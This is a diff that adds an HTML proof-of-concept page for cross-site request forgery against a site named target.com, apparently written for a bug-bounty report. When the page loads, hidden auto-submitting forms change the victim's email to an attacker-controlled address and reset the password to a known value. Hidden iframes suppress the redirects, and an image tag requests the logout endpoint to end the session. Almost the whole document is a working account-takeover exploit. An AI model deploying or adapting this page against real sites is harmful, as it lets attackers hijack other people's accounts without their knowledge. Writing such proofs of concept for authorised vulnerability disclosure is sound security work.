@@ -1,0 +1,40 @@
+<html>
+  <body>
+      <h1>This is a normal Web Page</h1>
+      <img src="https://i.pinimg.com/originals/a1/e7/ef/a1e7efabd3caddbddd2241fee618e093.jpg">
+      <h1>but your Account have been Hacked!</h1>
+      <div>
+         new email: qotoz+attacker@wearehackerone.com
+          
+          new password: Csrfattack-00
+</div>
+
+      <!-- the purpose of the iframe is to stop submitted forms from redirect us to a new page -->
+      <iframe name="dummyframe1" id="dummyframe1" style="display: none;"></iframe> 
+      <iframe name="dummyframe2" id="dummyframe2" style="display: none;"></iframe>
+  <script>history.pushState('', '', '/')</script>
+    <!-- the first form is to change the email to the attacker email -->
+    <form id="update_email" target="dummyframe1" action="https://www.target.com/settings/update_email" method="POST">
+      <input type="hidden" name="utf8" value="â&#156;&#147;" />
+      <input type="hidden" name="&#95;usec" value="510582" />
+      <input type="hidden" name="member&#91;set&#95;email&#93;" value="true" />
+      <input type="hidden" name="member&#91;email&#93;" value="qotoz&#43;attacker&#64;wearehackerone&#46;com" />
+      <input type="hidden" name="member&#91;email&#95;confirmation&#93;" value="qotoz&#43;attacker&#64;wearehackerone&#46;com" />
+      <input type="hidden" name="commit" value="Change&#32;Email&#32;Address" />
+    </form>
+    <!-- the second form is to change the password to a new one  -->
+    <form id="change_password" target="dummyframe2" action="https://www.target.com/settings/update_password" method="POST">
+      <input type="hidden" name="utf8" value="â&#156;&#147;" />
+      <input type="hidden" name="&#95;usec" value="929194" />
+      <input type="hidden" name="member&#91;password&#93;" value="Csrfattack&#45;00" />
+      <input type="hidden" name="member&#91;password&#95;confirmation&#93;" value="Csrfattack&#45;00" />
+      <input type="hidden" name="commit" value="Change&#32;Password" />
+    </form>
+    <script>
+  document.getElementById("update_email").submit();
+  document.getElementById("change_password").submit();
+  // sending GET request to the logout endpoint to log out the user and terminate the active session 
+  document.write("<img src=https://www.target.com/logout>");
+    </script>
+  </body>
+</html>
